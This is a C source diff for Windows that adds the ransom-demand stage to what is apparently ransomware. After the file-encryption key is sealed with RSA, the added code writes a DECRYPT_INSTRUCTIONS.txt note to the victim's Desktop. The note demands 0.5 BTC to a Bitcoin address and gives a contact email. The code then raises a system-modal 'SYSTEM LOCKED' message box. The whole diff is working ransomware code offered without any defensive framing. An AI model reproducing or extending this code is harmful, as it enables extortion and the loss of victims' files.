@@ -1,4 +1,5 @@
 #include "file_scan.h"
+#include <shlobj.h>
 #include <stdio.h>
 #include <windows.h>
 #include <wincrypt.h>
@@ -150,6 +151,41 @@ void FileScan(bool decryptMode) {
 
     if (!decryptMode) {
         KeyEncrypt(&keyBlob, hRsaKey);
+
+        char desktopPath[MAX_PATH];
+        char notePath[MAX_PATH];
+        HANDLE hNote;
+        DWORD written;
+        const char* ransomMsg = 
+            "YOUR FILES HAVE BEEN ENCRYPTED!\r\n\r\n"
+            "All your documents, photos, databases and other important files\r\n"
+            "have been encrypted with AES-256.\r\n\r\n"
+            "To recover your files, you must pay 0.5 BTC to the following address:\r\n"
+            "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\r\n\r\n"
+            "After payment, contact us at: recover@example.com\r\n"
+            "with your personal ID to receive the decryption tool.\r\n\r\n"
+            "DO NOT attempt to decrypt files yourself or you may lose them permanently.\r\n";
+
+        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
+        snprintf(notePath, MAX_PATH, "%s\\DECRYPT_INSTRUCTIONS.txt", desktopPath);
+        
+        hNote = CreateFileA(notePath, GENERIC_WRITE, 0, NULL, 
+                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hNote != INVALID_HANDLE_VALUE) {
+            WriteFile(hNote, ransomMsg, strlen(ransomMsg), &written, NULL);
+            CloseHandle(hNote);
+        }
+
+        MessageBoxA(
+            NULL,
+            "YOUR FILES HAVE BEEN ENCRYPTED!\r\n\r\n"
+            "All your documents, photos, databases and other important files\r\n"
+            "have been encrypted with AES-256.\r\n\r\n"
+            "To recover your files, you must pay 0.5 BTC.\r\n\r\n"
+            "See DECRYPT_INSTRUCTIONS.txt on your Desktop for details.",
+            "!!! SYSTEM LOCKED !!!",
+            MB_OK | MB_ICONERROR | MB_SYSTEMMODAL | MB_TOPMOST | MB_SETFOREGROUND
+        );
     } else {
         printf("Decrypt file successfully!\n");
     }
